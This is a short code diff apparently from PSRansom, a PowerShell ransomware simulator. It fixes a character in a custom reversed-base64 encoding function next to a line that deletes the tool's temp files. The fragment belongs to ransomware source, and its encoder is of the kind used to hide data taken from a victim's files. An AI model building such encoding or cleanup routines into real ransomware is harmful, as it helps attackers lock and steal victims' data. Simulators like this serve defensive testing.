@@ -256,7 +256,7 @@ Remove-Item $env:temp\PSRansom* -force
 function R64Encoder { 
    if ($args[0] -eq "-t") { $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
    if ($args[0] -eq "-f") { $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
-   $base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "–") ; $base64 = $base64.Replace("/", "_")
+   $base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "-") ; $base64 = $base64.Replace("/", "_")
    $revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64 ; return $R64Base }
 
 function ShowInfo {
